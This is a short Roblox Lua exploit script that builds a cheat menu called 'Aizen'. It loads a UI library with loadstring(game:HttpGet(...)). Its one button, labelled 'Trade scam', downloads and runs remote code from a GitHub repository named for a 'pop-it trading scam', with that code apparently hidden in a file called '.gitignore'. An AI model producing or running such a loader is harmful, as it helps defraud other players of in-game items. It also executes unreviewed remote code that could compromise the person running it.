local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Aizen", "Sentinel")

local Tab = Window:NewTab("Aizenhub")
local Section = Tab:NewSection("Aizenhublist")
Section:NewLabel("Aizenhub")

Section:NewButton("Pop it trading", "Trade scam", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/refs/heads/main/.gitignore"))() 
 print("Clicked")
end)
